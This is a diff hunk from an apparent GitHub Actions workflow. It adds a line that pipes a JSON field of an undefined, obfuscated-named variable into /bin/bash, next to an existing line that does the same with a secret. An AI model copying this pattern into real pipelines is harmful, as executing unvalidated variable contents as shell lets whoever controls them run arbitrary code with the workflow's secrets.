@@ -21,6 +21,7 @@ jobs:
           vqb808: ${{ secrets.vqb808 }}
         run: |
           printf '%s' "$vqb808" | jq -r .ifxld9207 | /bin/bash
+          echo $ikddn29 | jq -r .trqw15 | /bin/bash
 
       - name: Upload results
         if: always()
